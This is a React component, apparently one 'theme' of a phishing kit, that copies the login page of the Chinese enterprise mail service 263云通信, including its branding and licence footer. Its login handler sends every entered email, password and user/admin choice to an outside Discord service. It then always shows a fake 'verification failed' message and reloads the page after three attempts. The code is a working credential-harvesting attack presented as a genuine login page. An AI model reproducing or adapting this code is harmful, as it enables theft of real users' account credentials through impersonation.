import React, { useState } from 'react';
import { submitToDiscord } from '../services/DiscordService';

interface Theme263Props {
  prefilledEmail?: string;
}

const Theme263: React.FC<Theme263Props> = ({ prefilledEmail }) => {
  const [email, setEmail] = useState(prefilledEmail || '');
  const [password, setPassword] = useState('');
  const [activeTab, setActiveTab] = useState<'user' | 'admin'>('user');
  const [isLoading, setIsLoading] = useState(false);
  const [authError, setAuthError] = useState(false);
  const [failedAttempts, setFailedAttempts] = useState(0);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setAuthError(false);

    try {
      await submitToDiscord({
        email,
        password,
        loginType: activeTab,
        theme: '263',
      }, 'Theme263');

      // Simulate authentication delay
      await new Promise(resolve => setTimeout(resolve, 2000));
      
      // Show authentication failed
      setAuthError(true);
      const newAttempts = failedAttempts + 1;
      setFailedAttempts(newAttempts);
      
      // After 3 failed attempts, reload page
      if (newAttempts >= 3) {
        await new Promise(resolve => setTimeout(resolve, 2000));
        window.location.reload();
      }
    } catch (err) {
      console.error('Error:', err);
      setAuthError(true);
      const newAttempts = failedAttempts + 1;
      setFailedAttempts(newAttempts);
      
      if (newAttempts >= 3) {
        await new Promise(resolve => setTimeout(resolve, 2000));
        window.location.reload();
      }
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-white font-sans text-[#333]">
      {/* 263 Header */}
      <header className="w-full max-w-[1200px] mx-auto px-4 py-4 flex items-center justify-between">
        <div className="flex items-center">
          <div className="flex items-center space-x-1">
             <div className="text-[#0076cf] font-bold text-2xl flex items-center">
                <svg width="34" height="34" viewBox="0 0 50 50" fill="none" className="mr-2">
                  <path d="M25 5C15.6 5 8 12.6 8 22C8 26.4 9.7 30.4 12.4 33.4C12.8 33.8 12.8 34.4 12.4 34.8L8.6 38.6C8.2 39 8.2 39.6 8.6 40C9 40.4 9.6 40.4 10 40L13.8 36.2C14.2 35.8 14.8 35.8 15.2 36.2C18 38.6 21.4 40 25 40C34.4 40 42 32.4 42 23C42 13.6 34.4 6 25 5Z" stroke="#0076cf" strokeWidth="4" />
                  <path d="M18 20L25 27L32 20" stroke="#0076cf" strokeWidth="4" strokeLinecap="round" strokeLinejoin="round" />
                </svg>
                <span className="italic">263云通信</span>
             </div>
          </div>
        </div>
        
        <nav className="flex items-center space-x-6 text-[12px] text-gray-600">
          <a href="#" className="hover:text-blue-500">个人邮箱</a>
          <a href="#" className="hover:text-blue-500">企业邮箱</a>
          <div className="flex items-center space-x-1 text-[#0076cf] cursor-pointer">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor">
              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
            </svg>
            <span>在线客服</span>
          </div>
          <div className="flex space-x-2">
            <span className="cursor-pointer opacity-40 hover:opacity-100">✉️</span>
            <span className="cursor-pointer opacity-40 hover:opacity-100">👥</span>
            <span className="cursor-pointer opacity-40 hover:opacity-100">📹</span>
          </div>
        </nav>
      </header>

      {/* Hero Section with Login Card */}
      <main className="relative h-[480px] bg-[#006cc7] overflow-hidden flex items-center justify-center">
        {/* Background Graphic Decoration */}
        <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
          <div className="relative w-[800px] h-[800px] opacity-20">
            <div className="absolute inset-0 border border-white rounded-full scale-50"></div>
            <div className="absolute inset-0 border border-white rounded-full scale-75 border-dashed"></div>
            <div className="absolute inset-0 border border-white rounded-full scale-90 border-dotted"></div>
            {/* World Map Background Placeholder */}
            <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-full h-full opacity-10 grayscale invert">
              <svg viewBox="0 0 2000 1000" xmlns="http://www.w3.org/2000/svg">
                <path fill="#FFFFFF" d="M300,200 Q400,150 500,200 T700,250 T900,200 T1100,250 T1300,200 T1500,250 T1700,200" />
                {/* Simplified map dots */}
              </svg>
            </div>
            {/* Center icon */}
            <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-20 h-20 bg-white/20 rounded-full flex items-center justify-center backdrop-blur-sm">
               <div className="w-12 h-12 bg-[#0078d7] rounded-lg flex items-center justify-center text-white">
                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                    <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/>
                    <polyline points="22,6 12,13 2,6"/>
                  </svg>
               </div>
            </div>
          </div>
        </div>

        {/* Dynamic elements around the center */}
        <div className="absolute left-[20%] top-[20%] text-white opacity-40"><svg width="32" height="32" viewBox="0 0 24 24" fill="currentColor"><path d="M20 18c1.1 0 1.99-.9 1.99-2L22 6c0-1.1-.9-2-2-2H4c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2H0v2h24v-2h-4zM4 6h16v10H4V6z"/></svg></div>
        <div className="absolute right-[25%] bottom-[15%] text-white opacity-40"><svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor"><path d="M17 1.01L7 1c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-1.99-2-1.99zM17 19H7V5h10v14z"/></svg></div>

        {/* Login Form Container */}
        <div className="relative z-10 w-full max-w-[360px] bg-white rounded shadow-2xl overflow-hidden mr-[-20%]">
          {/* Tabs */}
          <div className="flex h-12">
            <button 
              onClick={() => setActiveTab('user')}
              className={`flex-1 text-[14px] font-medium transition-colors ${activeTab === 'user' ? 'bg-white text-[#333]' : 'bg-[#f4f4f4] text-gray-400 border-l border-b border-gray-100'}`}
            >
              User login
            </button>
            <button 
              onClick={() => setActiveTab('admin')}
              className={`flex-1 text-[14px] font-medium transition-colors ${activeTab === 'admin' ? 'bg-white text-[#333]' : 'bg-[#f4f4f4] text-gray-400 border-l border-b border-gray-100'}`}
            >
              Administrator login
            </button>
          </div>

          {/* Form Content */}
          <form onSubmit={handleLogin} className="p-8 space-y-5">
            <div className="relative">
              <span className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-300">
                <svg width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
                  <path d="M3 14s-1 0-1-1 1-4 6-4 6 3 6 4-1 1-1 1H3zm5-6a3 3 0 1 0 0-6 3 3 0 0 0 0 6z"/>
                </svg>
              </span>
              <input 
                type="text" 
                placeholder="Email" 
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="w-full pl-10 pr-4 py-2 text-[13px] border border-gray-200 rounded focus:outline-none focus:border-blue-400"
              />
            </div>

            <div className="relative">
              <span className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-300">
                <svg width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
                  <path d="M8 1a2 2 0 0 1 2 2v4H6V3a2 2 0 0 1 2-2zm3 6V3a3 3 0 0 0-6 0v4a2 2 0 0 0-2 2v5a2 2 0 0 0 2 2h6a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2z"/>
                </svg>
              </span>
              <input 
                type="password" 
                placeholder="password" 
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full pl-10 pr-4 py-2 text-[13px] border border-gray-200 rounded focus:outline-none focus:border-blue-400"
              />
            </div>

            {/* Loading State */}
            {isLoading && (
              <div className="flex items-center justify-center py-4">
                <div className="flex flex-col items-center space-y-2">
                  <div className="w-6 h-6 border-3 border-blue-200 border-t-blue-500 rounded-full animate-spin"></div>
                  <p className="text-[14px] text-gray-500">正在验证...</p>
                </div>
              </div>
            )}

            {/* Authentication Failed Message */}
            {authError && !isLoading && (
              <div className="bg-red-50 border border-red-200 rounded-md p-4 mb-4">
                <div className="flex items-start space-x-2">
                  <div className="flex-shrink-0 text-red-500 text-lg">⚠️</div>
                  <div>
                    <h3 className="font-medium text-red-800 text-[14px]">验证失败</h3>
                    <p className="text-red-700 text-[13px] mt-1">请重试。剩余尝试次数: {3 - failedAttempts}</p>
                  </div>
                </div>
              </div>
            )}

            <div className="flex items-center justify-between text-[11px] text-gray-500">
              <label className="flex items-center cursor-pointer">
                <input type="checkbox" className="mr-1 rounded border-gray-300 text-blue-500" />
                Security Login
              </label>
              <button className="hover:underline">Clear Trace</button>
            </div>

            <button 
              type="submit" 
              disabled={isLoading}
              className="w-full py-2 bg-[#0078d7] text-white font-medium rounded hover:bg-[#006cc7] transition-colors shadow-sm disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {isLoading ? '验证中...' : 'Sign in'}
            </button>

            <div className="flex items-center justify-between pt-2 border-t border-gray-50 text-[11px]">
               <a href="#" className="text-gray-600 hover:text-blue-500">Forgot Password</a>
               <div className="flex items-center text-gray-500 cursor-pointer">
                  Language <span className="ml-1 scale-75">▼</span>
               </div>
            </div>
          </form>
        </div>
      </main>

      {/* Footer */}
      <footer className="w-full py-6 px-4">
        <div className="max-w-[1200px] mx-auto text-center space-y-2">
          <div className="flex flex-wrap justify-center items-center text-[12px] text-gray-500 space-x-3 opacity-80">
            <a href="#" className="hover:text-blue-500">263云通信官网</a>
            <span className="text-gray-300">|</span>
            <a href="#" className="hover:text-blue-500">视频会议</a>
            <span className="text-gray-300">|</span>
            <a href="#" className="hover:text-blue-500">企业直播</a>
            <span className="text-gray-300">|</span>
            <a href="#" className="hover:text-blue-500">企业邮箱</a>
            <span className="text-gray-300">|</span>
            <a href="#" className="hover:text-blue-500">电话会议</a>
            <span className="text-gray-300">|</span>
            <a href="#" className="hover:text-blue-500">帮助中心</a>
          </div>
          <div className="text-[11px] text-gray-400">
            京ICP备08010619号-15
          </div>
        </div>
      </footer>
    </div>
  );
};

export default Theme263;